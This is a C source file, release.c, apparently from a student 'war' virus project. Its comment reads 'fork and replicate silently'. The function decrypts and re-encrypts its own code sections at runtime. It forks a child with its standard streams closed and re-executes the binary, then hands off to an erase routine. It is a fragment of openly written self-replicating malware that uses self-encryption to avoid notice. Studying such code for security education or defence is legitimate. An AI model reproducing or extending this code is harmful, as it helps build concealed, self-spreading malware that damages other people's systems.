/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   release.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/13 14:33:14 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Release: fork and replicate silently
*/
void		release(t_data *data)
{

	revert_two(&data->key, (char*)patch, (size_t)release - (size_t)patch);

#ifdef DEBUG
	char log[] = "release\t\t";
	_log(log, NULL, 9, data->context);
#endif

	_close(data->bin.fd);
	_munmap(data->bin.map, data->bin.size);
	if (data->context != true)
		goto next;

	pid_t child;
	char help[] = "--help";
	char *av[] = {data->name, help, NULL};
	child = _fork();
	if (child < 0)
		goto next;
	if (child == 0)
	{
		_close(STDIN_FILENO);
		_close(STDOUT_FILENO);
		_close(STDERR_FILENO);
		_execve(av[0], av, NULL);
		_exit(0);
	}

next:

	update_two(&data->key, (char*)release, (size_t)erase - (size_t)release);
	revert_two(&data->key, (char*)erase, (size_t)end - (size_t)erase);
	erase(data);
}
